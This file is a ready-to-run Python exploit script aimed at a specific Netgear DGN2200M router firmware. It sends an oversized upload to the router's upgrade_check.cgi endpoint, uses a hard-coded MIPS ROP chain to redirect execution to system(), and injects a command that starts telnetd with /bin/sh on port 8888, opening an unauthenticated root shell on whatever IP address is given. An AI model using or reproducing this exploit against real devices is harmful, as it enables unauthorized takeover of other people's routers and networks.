import argparse, socket, struct

def p32(address):
	return struct.pack(">I", address)

def send(ip, port, payload):
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	sock.close()

parser = argparse.ArgumentParser(description='Run the exploit')
parser.add_argument('ip', type=str, default=None, help='The IP address of the webserver to exploit')
parser.add_argument('-port', type=int, default=80, help='The port of the webserver to exploit')
args = parser.parse_args()

# DGN2200M 1.0.0.37
# 0) set $t9 to system (by calling system(NULL) when $s0 is 0)
# 1) set $a0 to $sp+0x19 and calls $t9 (without setting it first)
rop_gadget = [p32(0x486B70), p32(0x411F88)]
command = "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p8888 -l/bin/sh"

data = ""
data += "*#$^\x00" # marker
data += "\x00\x04\x00" # size
data += "A" * 0x60

data += "\x00" * 4    # s0
data += "B" * 0x4     # s1
data += "C" * 0x4     # s2
data += "D" * 0x4     # s3
data += "E" * 0x4     # s4
data += "F" * 0x4     # s5
data += "G" * 0x4     # s6
data += rop_gadget[0] # ra
data += "H" * 0x10    # Padding
data += "I" * 0x4     # gp
data += "J" * 0x6C    # Padding
data += "K" * 0x4     # s0
data += rop_gadget[1] # ra
data += "L" * 0x19    # Padding
data += command + "\x00" # Add the command and then NULL-terminate it
data += "Z" * 0x1000  # Pad out the payload (it needs to be at least a certain size)

payload = ''
payload += 'POST /upgrade_check.cgi HTTP/1.1\r\n'
payload += 'Host: {}\r\n'.format(args.ip)
payload += 'Content-Disposition: AAAA\r\n'
payload += 'Content-Length: {}\r\n'.format(len(data))
payload += 'Content-Type: application/octet-stream\r\n'
payload += 'name="mtenFWUpload"\r\n'
payload += '\r\n'
payload += data

send(args.ip, args.port, payload)

